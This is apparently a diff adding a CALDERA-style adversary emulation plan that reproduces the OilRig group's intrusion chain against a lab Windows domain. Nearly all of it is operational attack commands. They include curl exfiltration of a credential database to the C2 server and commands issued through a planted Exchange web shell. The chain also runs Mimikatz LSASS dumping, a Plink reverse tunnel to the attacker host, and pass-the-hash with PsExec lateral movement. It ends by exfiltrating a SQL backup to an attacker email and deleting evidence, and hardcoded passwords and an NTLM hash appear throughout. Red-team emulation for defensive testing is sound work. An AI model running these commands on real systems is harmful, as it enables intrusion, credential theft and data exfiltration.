@@ -1,0 +1,858 @@
+# oilrig.yaml - CALDERA Style TTPs
+
+- emulation_plan_details:
+    id: db88ae87-8884-42f1-aa06-d7ef9b45721d 
+    adversary_name: OilRig
+    adversary_description: OilRig is a suspected Iranian threat group that has targeted Middle Eastern and international victims. 
+    attack_version: 11.3
+    format_version: 1.0
+
+
+# Step 1 - Initial Compromise
+
+- id: ed2471a9-1eeb-4787-a5d8-61f66b278a50
+  name: OilRig Execute VBS payload to collect hostname
+  description: |
+    Executes the payload to collect the hostname of the victim machine. 
+  tactic: discovery
+  technique:
+    attack_id: T1082 
+    name: System Information Discovery
+  procedure_group: procedure_discovery
+  procedure_step: 1.A.4
+  platforms:
+    windows:
+      cmd:
+        command: |
+          cscript /nologo computername.vbs
+        payloads:
+          - computername.vbs
+
+- id: 88378065-bedf-46b9-a8b7-bc5897f4abcb
+  name: OilRig Execute VBS payload to collect username
+  description: |
+    Executes the payload to collect the username of the victim machine. 
+  tactic: discovery
+  technique:
+    attack_id: T1033
+    name: System Owner/User Discovery
+  procedure_group: procedure_discovery
+  procedure_step: 1.A.5
+  platforms:
+    windows:
+      cmd:
+        command: |
+          cscript /nologo username.vbs
+        payloads:
+          - username.vbs
+          
+          
+# Step 2 - Workstation Discovery
+
+- id: 0386ef16-757e-425c-8355-88e5be40eb32
+  name: OilRig Current User
+  description: Obtain user from current session
+  tactic: discovery 
+  technique: 
+    attack_id: T1033
+    name: "System Owner/User Discovery" 
+  procedure_group: procedure_discovery
+  procedure_step: 2.A.2
+  platforms:
+    windows:
+      cmd:
+        command: whoami
+  
+- id: a9861ea9-4f9a-46c9-ba60-15a02806dfdc
+  name: OilRig Collect hostname
+  description: Find the hostname
+  tactic: Discovery 
+  technique:
+    attack_id: T1082
+    name: System Information Discovery 
+  procedure_group: procedure_discovery
+  procedure_step: 2.A.3
+  platforms:
+    windows:
+      cmd:
+        command: hostname
+    
+- id: 628e8ad3-14af-4670-b797-bcf175a42842
+  name: OilRig Network Interface Configuration
+  description: View network configuration information for host
+  tactic: Discovery 
+  technique:
+    attack_id: T1016
+    name: System Network Configuration Discovery
+  procedure_group: procedure_discovery
+  procedure_step: 2.A.4
+  platforms:
+    windows:
+      cmd:
+        command: ipconfig /all
+
+- id: 13d5ab62-c05a-4d25-bd8f-e3b27a5be611
+  name: OilRig Domain Account Discovery
+  description: The net utility is executed via cmd to enumerate domain user accounts.
+  tactic: Discovery 
+  technique:
+    attack_id: T1087.002
+    name: "Account Discovery: Domain Account"
+  procedure_group: procedure_discovery
+  procedure_step: 2.A.5
+  platforms:
+    windows:
+      cmd:
+        command: net user /domain
+
+- id: e0b534a6-bff3-4964-8f7b-863ddee224b0
+  name: OilRig Group Account Discovery
+  description: The net utility is executed via cmd to enumerate group accounts.
+  tactic: Discovery 
+  technique:
+    attack_id: T1069.002
+    name: "Permission Groups Discovery: Domain Groups"
+  procedure_group: procedure_discovery
+  procedure_step: 2.A.6
+  platforms:
+    windows:
+      cmd:
+        command: net group /domain
+
+- id: 3d450711-1062-4276-8bff-bb78ec4f4519
+  name: OilRig "domain admins" Group Discovery
+  description: The net utility is executed via cmd to enumerate the "domain admins" group
+  tactic: Discovery 
+  technique:
+    attack_id: T1069.002 
+    name: "Permission Groups Discovery: Domain Groups"
+  procedure_group: procedure_discovery
+  procedure_step: 2.A.7
+  platforms:
+    windows:
+      cmd:
+        command: net group "domain admins" /domain
+
+- id: 29c018ed-eb3e-4ddb-90ec-ba3d928a00e8
+  name: OilRig "Exchange Trusted Subsystem" Group Discovery
+  description: The net utility is executed via cmd to enumerate the "Exchange Trusted Subsystem" group
+  tactic: Discovery 
+  technique:
+    attack_id: T1069.002 
+    name: "Permission Groups Discovery: Domain Groups"
+  procedure_group: procedure_discovery
+  procedure_step: 2.A.8
+  platforms:
+    windows:
+      cmd:
+        command: net group "Exchange Trusted Subsystem" /domain 
+
+- id: 41ce9dd8-dc9f-4fba-8ce9-9ef5aaee3d19
+  name: OilRig List domain account settings
+  description: View domain account settings and password policy
+  tactic: Discovery 
+  technique:
+    attack_id: T1021 
+    name: Password Policy Discovery 
+  procedure_group: procedure_discovery
+  procedure_step: 2.A.9
+  platforms:
+    windows:
+      cmd:
+        command: net accounts /domain
+
+- id: 821fd81e-2086-4ea6-b792-fb9e044e2323
+  name: OilRig Local Account Discovery
+  description: Enumerate user accounts
+  tactic: Discovery 
+  technique:
+    attack_id: T1087.001 
+    name: "Account Discovery: Local Account"
+  procedure_group: procedure_discovery
+  procedure_step: 2.A.10
+  platforms:
+    windows:
+      cmd:
+        command: net user
+
+- id: ae4e4c08-82cb-4a17-a873-660f851a1a38
+  name: OilRig "administrators" local group discovery
+  description: View the details and members of the "administrators" local group
+  tactic: Discovery 
+  technique:
+    attack_id: T1069.001 
+    name: "Permission Groups Discovery: Local Groups"
+  procedure_group: procedure_discovery
+  procedure_step: 2.A.11
+  platforms:
+    windows:
+      cmd:
+        command: net localgroup administrators
+
+- id: cb8e9faa-ac00-48d8-a359-88044a2c0252
+  name: OilRig View Network Connections
+  description: Find system network connections
+  tactic: Discovery 
+  technique:
+    attack_id: T1049 
+    name: "System Network Connections Discovery"
+  procedure_group: procedure_discovery
+  procedure_step: 2.A.12
+  platforms:
+    windows:
+      cmd:
+        command: netstat -na
+    
+- id: de39f574-f6cc-4026-973e-c5370b36220b
+  name: OilRig Process discovery
+  description: View running processes on system
+  tactic: Discovery 
+  technique:
+    attack_id: T1057 
+    name: Process Discovery 
+  procedure_group: procedure_discovery
+  procedure_step: 2.A.13
+  platforms:
+    windows:
+      cmd:
+        command: tasklist
+
+- id: e6eb7d18-606e-4889-8924-f75cafa92811
+  name: OilRig System Service Discovery
+  description: Gather information about registered local system services
+  tactic: Discovery 
+  technique:
+    attack_id: T1007 
+    name: System Service Discovery 
+  procedure_group: procedure_discovery
+  procedure_step: 2.A.14
+  platforms:
+    windows:
+      cmd:
+        command:  sc query
+
+- id: 178bb431-4eaf-43b1-922c-f484ab54bbee
+  name: OilRig System Information Discovery
+  description: Gather detailed system information
+  tactic: Discovery 
+  technique:
+    attack_id: T1082 
+    name: System Information Discovery 
+  procedure_group: procedure_discovery
+  procedure_step: 2.A.15
+  platforms:
+    windows:
+      cmd:
+        command: systeminfo
+
+- id: 09502b3c-7541-4c11-92a9-f55e683a6355
+  name: OilRig Query Registry
+  description: Query the Windows registry key HKEY_CURRENT_USER\Software\Microsoft\Terminal Server Client\Default
+  tactic: Discovery 
+  technique:
+    attack_id: T1012 
+    name: Query Registry 
+  procedure_group: procedure_discovery
+  procedure_step: 2.A.16
+  platforms:
+    windows:
+      cmd:
+        command: reg query "HKEY_CURRENT_USER\Software\Microsoft\Terminal Server Client\Default" 
+
+- id: 7971246d-1392-411e-a803-a7946cf9e4d2
+  name: OilRig Targeted "Gosta" Account Discovery
+  description: The net utility is executed via cmd to enumerate detailed information about the Gosta user account
+  tactic: Discovery 
+  technique:
+    attack_id: T1087.002 
+    name: "Account Discovery: Domain Account"
+  procedure_group: procedure_discovery
+  procedure_step: 2.A.17
+  platforms:
+    windows:
+      cmd:
+        command: |
+          net user #{initial.target.user} /domain
+  input_arguments:
+    initial.target.user:
+      description: The username of the target host for initial access.
+      type: string
+      default: gosta
+
+- id: 6a7b4ba0-a9bb-451d-ba9f-d3a2e8a82ffe
+  name: OilRig "SQL Admins" Group Discovery
+  description: The net utility is executed via cmd to enumerate the "SQL Admins" group
+  tactic: Discovery 
+  technique:
+    attack_id: T1069.002 
+    name: "Permission Groups Discovery: Domain Groups"
+  procedure_group: procedure_discovery
+  procedure_step: 2.A.18
+  platforms:
+    windows:
+      cmd:
+        command: net group "SQL Admins" /domain 
+
+- id: f9f1bd68-ec0a-47e7-8645-210844190d92
+  name: OilRig nslookup WATERFALLS
+  description: Perform DNS lookup for WATERFALLS
+  tactic: Discovery 
+  technique:
+    attack_id: T1018 
+    name: Remote System Discovery 
+  procedure_group: procedure_discovery
+  procedure_step: 2.A.19
+  platforms:
+    windows:
+      cmd:
+        command: |
+          nslookup #{second.target.host}
+  input_arguments:
+    second.target.host:
+      description: The hostname address of the second target host.
+      type: string
+      default: WATERFALLS
+
+
+# Step 3 - Workstation Low Privilege Credential Dumping test
+
+- id: a23fb84f-dfb7-4d07-a6ec-0352ae983651
+  name: OilRig Dump Credentials from Windows Credential Manager
+  description: |
+    Create a SQLite database with output of Windows Credential Value for Internet Explorer
+  tactic: credential-access
+  technique:
+    attack_id: T1555.004  
+    name: "Credentials from Password Stores: Windows Credential Manager"
+  procedure_group: procedure_credential_access
+  procedure_step: 3.A.2
+  platforms:
+    windows:
+      cmd:
+        command: |
+          C:\Users\#{initial.target.user}\AppData\local\SystemFailureReporter\b.exe
+        payloads:
+        - b.exe
+
+- id: 021245dd-c0be-4900-bd6c-1c680f00a237
+  name: OilRig Exfil fsociety.dat
+  description: Exfil the SQLite database fsociety.dat created by b.exe
+  tactic: exfiltration
+  technique:
+    attack_id: T1041  
+    name: Exfiltration Over C2 Channel 
+  procedure_group: procedure_exfiltration
+  procedure_step: 3.A.3
+  platforms:
+    windows:
+      cmd:
+        command: |
+          curl -F "data=@C:\Users\#{initial.target.user}\AppData\Roaming\fsociety.dat" --header "X-Request-ID: #{initial.target.user}-#{paw}" #{server}/file/upload
+
+
+# Step 4 - Install Web Shell on EWS
+
+- id: 2f3be960-5c00-4f03-a9c2-da09c31d38d9
+  name: OilRig Copy webshell to THEBLOCK
+  description: |
+    SystemFailureReporter.exe downloads contact.aspx
+  tactic: Command and Control
+  technique:
+    attack_id: T1105  
+    name: Ingress Tool Transfer
+  procedure_group: procedure_discovery
+  procedure_step: 4.A.1
+  platforms:
+    windows:
+      cmd:
+        command: |
+          copy  C:\Users\#{initial.target.user}\AppData\Local\SystemFailureReporter\contact.aspx C:\Users\Public\contact.aspx
+        payloads:
+          - contact.aspx
+
+- id: 7aaecfb7-a1eb-477c-8d53-ab3009389623
+  name: OilRig Copy webshell to WATERFALLS
+  description: |
+    contact.aspx is copied from THEBLOCK to WATERFALL to the Exchange Web Services directory. This ability implements Step 4.A.3.  
+  tactic: persistence
+  technique:
+    attack_id: T1505.003   
+    name: "Server Software Component: Web Shell"
+  procedure_group: procedure_persistence
+  procedure_step: 4.A.2
+  platforms:
+    windows:
+      cmd:
+        command: |
+          copy C:\Users\Public\contact.aspx "\\#{second.target.ip}\C$\Program Files\Microsoft\Exchange Server\V15\ClientAccess\exchweb\ews\"
+  input_arguments:
+    second.target.ip:
+      description: The IPv4 address of the Exchange server.
+      type: string
+      default: 10.1.0.6
+      
+- id: 5f7dc4b3-1287-4a25-b0b0-b6e73756cc11
+  name: OilRig Set file hidden attribute
+  description: |
+    Set file hidden attribute for contact.aspx on WATERFALLS
+  tactic: defense-evasion
+  technique:
+    attack_id: T1082 
+    name: "Hide Artifacts: Hidden Files & Directories"
+  procedure_group: procedure_defense_evasion
+  procedure_step: 4.A.4
+  platforms:
+    windows:
+      cmd:
+        command: attrib +h "\\#{second.target.ip}\C$\Program Files\Microsoft\Exchange Server\V15\ClientAccess\exchweb\ews\contact.aspx"
+
+
+# Step 5 - EWS Discovery
+
+- id: 87d3322b-a435-47b5-9f97-a8db4f86dad5
+  name: OilRig Current User (Kali Agent)
+  description: Attacker machine obtains user from current session gosta's current session on 10.1.0.6
+  tactic: discovery 
+  technique: 
+    attack_id: T1033
+    name: "System Owner/User Discovery" 
+  procedure_group: procedure_discovery
+  procedure_step: 5.A.2
+  platforms:
+    linux:
+      sh:
+        command: |
+          curl -s --http1.1 --ntlm -u '#{network.domain.name}\#{initial.target.user}:#{initial.target.password}' -k -X POST --data "pro=cmd.exe" --data "cmd=whoami" https://#{second.target.ip}/ews/contact.aspx
+  input_arguments:
+    initial.target.password:
+      description: The password of the target host for initial access.
+      type: string
+      default: d0ntGoCH4ingW8trfalls
+    network.domain.name:
+      description: Network domain name for initial target system.
+      type: string
+      default: boom.box
+
+- id: 48927544-5a18-11ed-9b6a-0242ac120002
+  name: OilRig Network Interface Configuration (Kali Agent)
+  description: Attacker machine views network configuration information for gosta on 10.1.0.6
+  tactic: Discovery 
+  technique:
+    attack_id: T1016
+    name: System Network Configuration Discovery
+  procedure_group: procedure_discovery
+  procedure_step: 5.A.3
+  platforms:
+    linux:
+      sh:
+        command: |
+          curl -s --http1.1 --ntlm -u '#{network.domain.name}\#{initial.target.user}:#{initial.target.password}' -k -X POST --data "pro=cmd.exe" --data "cmd=ipconfig /all" https://#{second.target.ip}/ews/contact.aspx
+
+- id: 5c279562-a004-4d9c-9ec6-a7dc4997f699
+  name: OilRig View Network Connections (Kali Agent)
+  description: Attacker machine views system network connections for gosta on 10.1.0.6
+  tactic: Discovery 
+  technique:
+    attack_id: T1049 
+    name: "System Network Connections Discovery"
+  procedure_group: procedure_discovery
+  procedure_step: 5.A.4
+  platforms:
+    linux:
+      sh:
+        command: |
+          curl -s --http1.1 --ntlm -u '#{network.domain.name}\#{initial.target.user}:#{initial.target.password}' -k -X POST --data "pro=cmd.exe" --data "cmd=netstat -an" https://#{second.target.ip}/ews/contact.aspx
+
+
+# Step 6 - Privileged Credential Dumping
+
+- id: f96e8195-8b0f-4b87-bdce-748dfda2861f
+  name: OilRig Download Mimikatz (Kali Agent)
+  description: Download Mimikatz
+  tactic: Command and Control 
+  technique:
+    attack_id: T1105  
+    name: "Ingress Tool Transfer"
+  procedure_group: procedure_command_and_control
+  procedure_step: 6.A.1
+  platforms:
+    linux:
+      sh:
+        command: |
+          curl -s --http1.1 --ntlm -u '#{network.domain.name}\#{initial.target.user}:#{initial.target.password}' -k -X POST -F "upl=f1" -F 'sav=C:\Windows\temp\' -F "vir=false" -F "nen=m64.exe" -F 'f1=@m64.exe' https://#{second.target.ip}/EWS/contact.aspx
+        payloads:
+          - m64.exe
+
+- id: f01e86f9-0b66-4191-beee-324c380690df
+  name: OilRig Execute Mimikatz (Kali Agent)
+  description: Dump credentials using Mimikatz
+  tactic: Credential Access  
+  technique:
+    attack_id: T1003.001   
+    name: "OS Credential Dumping: LSASS Memory"
+  procedure_group: procedure_credential_access
+  procedure_step: 6.A.2
+  platforms:
+    linux:
+      sh:
+        command: |
+          curl -s --http1.1 --ntlm -u '#{network.domain.name}\#{initial.target.user}:#{initial.target.password}' -k -X POST --data "pro=cmd.exe" --data "cmd=C:\Windows\Temp\m64.exe privilege::debug sekurlsa::logonPasswords exit 1> C:\Windows\Temp\01.txt" https://#{second.target.ip}/ews/contact.aspx
+ 
+- id: 845d36f1-13b6-4d42-a384-aa2f4af9bc27
+  name: OilRig Exfiltrate Mimikatz Output (Kali Agent)
+  description: Exfiltrate the resulting output file to the attacker system
+  tactic: Exfiltration
+  technique:
+    attack_id: T1041   
+    name: "Exfiltration Over C2 Channel"
+  procedure_group: procedure_exfiltration
+  procedure_step: 6.A.3
+  platforms:
+    linux:
+      sh:
+        command: |
+          curl -s --http1.1 --ntlm -u '#{network.domain.name}\#{initial.target.user}:#{initial.target.password}' -k -X POST -o 01.txt --data 'don=c:\windows\temp\01.txt' https://#{second.target.ip}/EWS/contact.aspx
+
+- id: 6482ba12-fa47-409c-bab8-704de6475e38
+  name: OilRig Delete Mimikatz and MimiKatz Output (Kali Agent)
+  description: Clean up by removing the binary and output file
+  tactic: Defense Evasion 
+  technique:
+    attack_id: T1070.004   
+    name: "Indicator Removal on Host: File Deletion"
+  procedure_group: procedure_defense_evasion
+  procedure_step: 6.A.4
+  platforms:
+    linux:
+      sh:
+        command: |
+          curl -s --http1.1 --ntlm -u '#{network.domain.name}\#{initial.target.user}:#{initial.target.password}' -k -X POST --data "pro=cmd.exe" --data "cmd=del C:\windows\temp\01.txt C:\windows\temp\m64.exe" https://#{second.target.ip}/EWS/contact.aspx
+          
+
+# Step 7 - Lateral Movement to EWS via RDP Tunnel
+
+- id: f3df5a83-2a5a-4277-8763-8fb51032d3fc
+  name: OilRig Download Plink
+  description: |
+    Download Plink in order to gain RDP access
+  tactic: "Command and Control"
+  technique:
+    attack_id: T1105
+    name: "Ingress Tool Transfer"
+  procedure_group: procedure_command_and_control
+  procedure_step: 7.A.1
+  platforms:
+    windows:
+      cmd:
+        command: |
+          copy  C:\Users\#{initial.target.user}\AppData\Local\SystemFailureReporter\plink.exe C:\Users\Public\Downloads\plink.exe
+        payloads:
+          - plink.exe
+
+- id: 212995b5-acfc-404b-b3a9-a19cc0afa9a5
+  name: OilRig Run Plink
+  description: |
+    Run Plink
+  tactic: "Command and Control"
+  technique:
+    attack_id: T1572
+    name: "Protocol Tunneling"
+  procedure_group: procedure_command_and_control
+  procedure_step: 7.A.2
+  platforms:
+    windows:
+      proc:
+        command: |
+          exec-background C:\Users\Public\Downloads\plink.exe -no-antispoof -ssh -N -R #{caldera.server.ip}:13389:#{second.target.ip}:3389 -l #{caldera.user.name} -pw "#{caldera.user.password}" #{caldera.server.ip}
+        timeout: 120
+  input_arguments:
+    caldera.server.ip:
+      description: The IPv4 address of the attacker system.
+      type: string
+      default: 192.168.0.4
+    caldera.user.password:
+      description: The password for the attacker system.
+      type: string
+      default: ceKa#zUUc4^9yZ
+    caldera.user.name:
+      description: The username of the attacker system.
+      type: string
+      default: saka
+
+- id: dc2efbdd-3ab4-44a0-9839-385540b8a8cc
+  name: OilRig RDP to WATERFALLS
+  description: |
+    RDP to 10.1.0.6 using xfreerdp
+  tactic: "Lateral Movement"
+  technique:
+    attack_id: T1021.001
+    name: "Remote Services: Remote Desktop Protocol"
+  procedure_group: procedure_lateral_movement
+  procedure_step: 7.A.4
+  platforms:
+    linux:
+      proc:
+        command: |
+          exec-background xfreerdp /u:'#{network.domain.name}\#{initial.target.user}' /p:'#{initial.target.password}' /v:localhost:13389 /cert-ignore
+
+
+# Step 8
+
+- id: 5cb977ae-87c8-450f-b016-f414b42ba60f
+  name: OilRig Downloads PsExec
+  description: OilRig uses the webshell to download PsExec as ps.exe to WATERFALLS
+  tactic: Command and Control 
+  technique: 
+    attack_id: T1105 
+    name: "Ingress Tool Transfer" 
+  procedure_group: procedure_command_and_control
+  procedure_step: 8.A.2
+  platforms:
+    linux:
+      sh:
+        command: |
+          curl -s --http1.1 --ntlm -u '#{network.domain.name}\#{initial.target.user}:#{initial.target.password}' -k -X POST -F "upl=f1" -F 'sav=C:\Windows\System32' -F "vir=false" -F "nen=ps.exe" -F 'f1=@PsExec.exe' https://#{second.target.host}/ews/contact.aspx
+        payloads:
+          - PsExec.exe
+
+- id: d5b83af2-b79e-438d-acfc-2641282df698
+  name: OilRig Downloads RDAT
+  description: OilRig uses the webshell to download RDAT as nt.dat to WATERFALLS
+  tactic: Command and Control 
+  technique: 
+    attack_id: T1105 
+    name: "Ingress Tool Transfer" 
+  procedure_group: procedure_command_and_control
+  procedure_step: 8.A.3
+  platforms:
+    linux:
+      sh:
+        command: |
+          curl -s --http1.1 --ntlm -u '#{network.domain.name}\#{initial.target.user}:#{initial.target.password}' -k -X POST -F "upl=f1" -F 'sav=C:\Windows\Temp' -F "vir=false" -F "nen=Nt.dat" -F 'f1=@RDAT.exe' https://#{second.target.host}/ews/contact.aspx
+        payloads:
+          - RDAT.exe
+
+- id: 98279c81-d5a0-4ec4-9d40-a6e87d1f9bd2
+  name: OilRig Downloads mom64.exe
+  description: OilRig uses the webshell to download Mimikatz as mom64.exe to WATERFALLS
+  tactic: Command and Control 
+  technique: 
+    attack_id: T1105 
+    name: "Ingress Tool Transfer" 
+  procedure_group: procedure_command_and_control
+  procedure_step: 8.A.4
+  platforms:
+    linux:
+      sh:
+        command: |
+          curl -s --http1.1 --ntlm -u '#{network.domain.name}\#{initial.target.user}:#{initial.target.password}' -k -X POST -F "upl=f1" -F 'sav=C:\Windows\System32' -F "vir=false" -F "nen=mom64.exe" -F 'f1=@m64.exe' https://#{second.target.host}/ews/contact.aspx
+        payloads:
+          - m64.exe
+
+- id: 44073aa3-70e9-4a48-86b7-c25b6f29c25c
+  name: OilRig PSEXEC is used to execute commands on ENDOFROAD
+  description: |
+    Requires xdotool to be installed on the running machine. 
+    Uses xdotool to control the RDP window to 10.1.0.6 that was opened in Step 7.A.4. 
+    Executes Mimikatz PTH, copies RDAT to 10.1.0.7, and PsExecs to the SQL server
+  tactic: Execution
+  technique:
+    attack_id: T1569.002
+    name: "System Services: Service Execution"
+  procedure_group: procedure_execution
+  procedure_step: 8.A.9
+  platforms:
+    linux:
+      sh:
+        command: |
+          sleep 5;
+          rdp_pid=$(pgrep -f "xfreerdp.*/v:localhost");
+          rdp_window=$(xdotool search --pid "$rdp_pid");
+          xdotool key --window "$rdp_window" Super_L;
+          sleep 5; 
+          xdotool windowactivate --sync "$rdp_window" type --delay 200 "cmd";
+          sleep 3; 
+          xdotool key --window "$rdp_window" Ctrl+Shift+Return;
+          sleep 3; 
+          xdotool key --window "$rdp_window" Tab Tab;
+          xdotool key --window "$rdp_window" Return;
+          sleep 3; 
+          xdotool type --window "$rdp_window" 'C:\Windows\System32\mom64.exe "privilege::debug" "sekurlsa::pth /user:#{second.target.user} /domain:#{network.domain.name} /ntlm:#{second.target.ntlm}"';
+          xdotool key --window "$rdp_window" Return;
+          sleep 3; 
+          xdotool type --window "$rdp_window" 'copy C:\Windows\Temp\Nt.dat \\#{third.target.ip}\C$\ProgramData\';
+          xdotool key --window "$rdp_window" Return;
+          sleep 3; 
+          xdotool type --window "$rdp_window" 'C:\Windows\System32\ps.exe \\#{third.target.ip} cmd.exe';
+          xdotool key --window "$rdp_window" Return;
+          sleep 5;
+        timeout: 150
+  input_arguments:
+    second.target.user:
+      description: The username for the SQL server administrator.
+      type: string
+      default: tous
+    second.target.ntlm:
+      description: NTLM hash value for the user of the SQL server administrator.
+      type: string
+      default: 9b7ff4cc0878bee9f099a4a7dc7227c3
+    third.target.ip:
+      description: The IPv4 address of the SQL server.
+      type: string
+      default: 10.1.0.7
+
+
+# Step 9
+
+- id: f1f34439-ca0d-4fe7-99af-a198a29b6a3e
+  name: OilRig File and Directory Discovery on ENDOFROAD
+  description: |
+    Requires xdotool to be installed on the running machine. 
+    Uses xdotool to execute file and directory discovery commands on ENDOFROAD
+  tactic: Discovery
+  technique:
+    attack_id: T1083
+    name: "File and Directory Discovery"
+  procedure_group: procedure_discovery
+  procedure_step: 9.A.1-2
+  platforms:
+    linux:
+      sh:
+        command: |
+          sleep 3;
+          rdp_pid=$(pgrep -f "xfreerdp.*/v:localhost");
+          rdp_window=$(xdotool search --pid "$rdp_pid");
+          sleep 3; 
+          xdotool type --window "$rdp_window" 'dir "C:\Program Files\Microsoft SQL Server\"';
+          xdotool key --window "$rdp_window" Return;
+          sleep 3; 
+          xdotool type --window "$rdp_window" 'dir "C:\Program Files\Microsoft SQL Server\MSSQL15.MSSQLSERVER\MSSQL\Backup\"';
+          xdotool key --window "$rdp_window" Return;
+          sleep 4;
+
+
+# Step 10
+
+- id: 885c14a2-bc56-4176-8671-4cb25489ae39
+  name: OilRig Exfiltrate Data via EWS API to attacker-controlled email
+  description: |
+    Requires xdotool to be installed on the running machine. 
+    Creates a directory to stage collected data and moves RDAT to the newly created directory.
+    Read and exfiltrate the data from sitedata_db.bak in chunks via EWS API to an attacker-controlled email.
+  tactic: exfiltration
+  technique:
+    attack_id: T1048.003
+    name: "Exfiltration Over Alternative Protocol: Exfiltration Over Unencrypted/Obfuscated Non-C2 Protocol"
+  procedure_group: procedure_defense_evasion
+  procedure_step: 10.A.6
+  platforms:
+    linux:
+      sh:
+        command: |
+          sleep 2;
+          rdp_pid=$(pgrep -f "xfreerdp.*/v:localhost");
+          rdp_window=$(xdotool search --pid "$rdp_pid");
+          sleep 3; 
+          xdotool type --window "$rdp_window" 'mkdir C:\Programdata\Vmware';
+          xdotool key --window "$rdp_window" Return;
+          sleep 3; 
+          xdotool type --window "$rdp_window" 'move C:\Programdata\Nt.dat C:\Programdata\Vmware\VMware.exe';
+          xdotool key --window "$rdp_window" Return;
+          sleep 3;
+          xdotool type --window "$rdp_window" 'cd "C:\Program Files\Microsoft SQL Server\MSSQL15.MSSQLSERVER\MSSQL\Backup\"';
+          xdotool key --window "$rdp_window" Return;
+          sleep 3;
+          xdotool type --window "$rdp_window" 'C:\ProgramData\Vmware\VMware.exe --path="sitedata_db.bak" --to="#{exfil.target.email}" --from="#{initial.target.user}@#{network.domain.name}" --server="#{second.target.ip}" --password='#{initial.target.password}' --chunksize="200000"';
+          sleep 1; 
+          xdotool key --window "$rdp_window" Return;
+          sleep 15;
+  input_arguments:
+    exfil.target.email:
+      description: The adversary-controlled email address used to exfiltrate data.
+      type: string
+      default: sistan@shirinfarhad.com
+
+
+# Step 11
+
+- id: 0c5cf9e2-3152-4b4c-9629-2ed7a00da09d
+  name: OilRig Cleanup via RDP
+  description: |
+    Requires xdotool to be installed on the running machine. 
+    Emulates OilRig's cleanup and egress from the target network.
+  tactic: defense-evasion
+  technique:
+    attack_id: T1070.004  
+    name: "Indicator Removal on Host: File Deletion"
+  procedure_group: procedure_defense_evasion
+  procedure_step: 11.A.1-3
+  platforms:
+    linux:
+      sh:
+        command: |
+          sleep 3;
+          rdp_pid=$(pgrep -f "xfreerdp.*/v:localhost");
+          rdp_window=$(xdotool search --pid "$rdp_pid");
+          sleep 3; 
+          xdotool type --window "$rdp_window" 'del C:\ProgramData\VMware\VMware.exe';
+          sleep 3; 
+          xdotool key --window "$rdp_window" Return;
+          sleep 3; 
+          xdotool type --window "$rdp_window" 'rmdir C:\ProgramData\VMware';
+          sleep 3; 
+          xdotool key --window "$rdp_window" Return;
+          sleep 1;
+          xdotool type --window "$rdp_window" 'exit';
+          xdotool key --window "$rdp_window" Return;
+          sleep 1;
+          xdotool type --window "$rdp_window" 'exit';
+          xdotool key --window "$rdp_window" Return;
+          sleep 3;
+          xdotool type --window "$rdp_window" 'exit';
+          xdotool key --window "$rdp_window" Return;
+          sleep 2;
+          xdotool type --window "$rdp_window" 'del C:\Windows\System32\mom64.exe C:\Windows\temp\Nt.dat C:\Windows\System32\ps.exe';
+          xdotool key --window "$rdp_window" Return;
+          sleep 2;   
+          xdotool type --window "$rdp_window" 'exit';
+          xdotool key --window "$rdp_window" Return;
+          sleep 2;
+          
+          kill $(ps aux | grep "sshd: #{caldera.user.name}" | grep -v priv | grep -v grep | awk '{print $2}')
+
+- id: d9c9a941-c0e8-4eed-8cc3-6511ad5b9e15
+  name: OilRig Cleanup on Gosta
+  description: |
+    Delete VALUEVAULT plink.exe.
+  tactic: defense-evasion
+  technique:
+    attack_id: T1070.004  
+    name: "Indicator Removal on Host: File Deletion"
+  procedure_group: procedure_defense_evasion
+  procedure_step: 11.A.4
+  platforms:
+    windows:
+      cmd:
+        command: |
+          del C:\Users\gosta\AppData\Roaming\fsociety.dat C:\Users\Public\Downloads\plink.exe;
+
+- id: 16767c68-a865-46af-a0e4-ff8d742efc3f
+  name: OilRig Kill Gosta Agent
+  description: |
+    Gosta Agent kills itself
+  tactic: defense-evasion
+  technique:
+    attack_id: T1070.004  
+    name: "Indicator Removal on Host: File Deletion"
+  procedure_group: procedure_defense_evasion
+  procedure_step: 11.A.4
+  platforms:
+    windows:
+      cmd:
+        command: |
+          curl -s -H "KEY:#{server.api.key}" -H "Content-Type: application/json" -X PATCH http://#{caldera.server.ip}:8888/api/v2/agents/#{paw} -d "{\"watchdog\":1}"
+  input_arguments:
+    server.api.key:
+      description: API key for the CALDERA server
+      type: string
+      default: ADMIN123
